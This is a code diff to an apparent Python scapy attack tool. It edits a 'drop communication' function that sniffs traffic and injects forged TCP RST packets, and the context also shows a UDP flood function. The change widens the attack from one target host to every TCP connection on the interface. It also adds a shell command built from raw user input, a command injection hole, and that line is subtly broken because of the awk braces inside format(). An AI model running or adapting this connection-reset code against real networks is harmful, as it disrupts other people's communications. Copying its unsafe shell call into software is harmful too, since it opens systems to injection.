@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, TCP, ICMP
+import subprocess
 
 
 def attack_to_perform(number):
@@ -327,12 +328,16 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 
 # (14) Code to perform drop communication
 def perform_drop_communication(ip_addr=None):
+    
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
+    cmd = "ip a | grep {} | awk '{print $7}'".format(ip_addr)
+    IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
+
     # Create a packet filter to capture packets from the specified IP address
-    filter_str = "tcp and src host {}".format(ip_addr)
+    filter_str = "tcp"
 
     # Sniff packets and execute RST attack
     def packet_handler(packet):
@@ -353,15 +358,15 @@ def perform_drop_communication(ip_addr=None):
                 )
 
                 # Send the RST packet
-                send(IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet, verbose=0)
+                send(IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet, iface=IFACE, verbose=0)
 
                 # Print the dropped communication
                 print(
-                    "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}, Seq: {}, Ack: {}".format(
+                    "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}, rst_Seq: {}, rst_Ack: {}".format(
                         packet[IP].src,
                         packet[IP].dst,
-                        rst_packet[TCP].sport,
-                        rst_packet[TCP].dport,
+                        packet[TCP].sport,
+                        packet[TCP].dport,
                         rst_packet[TCP].seq,
                         rst_packet[TCP].ack,
                     )
@@ -369,7 +374,7 @@ def perform_drop_communication(ip_addr=None):
 
     # Start sniffing packets and call the packet_handler for each captured packet
     print("Start sniffing...")
-    sniff(filter=filter_str, prn=packet_handler)
+    sniff(iface=IFACE, filter=filter_str, prn=packet_handler)
 
     return "Drop communication performed on IP address: {}".format(ip_addr)
 
